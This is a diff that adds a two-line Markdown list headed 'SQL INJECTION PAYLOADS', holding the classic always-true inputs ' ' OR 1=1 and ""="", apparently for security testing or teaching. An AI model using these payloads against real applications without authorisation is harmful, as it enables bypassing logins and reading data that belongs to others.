@@ -1,0 +1,4 @@
+# SQL INJECTION PAYLOADS
+> ' ' OR 1=1
+
+> ""=""
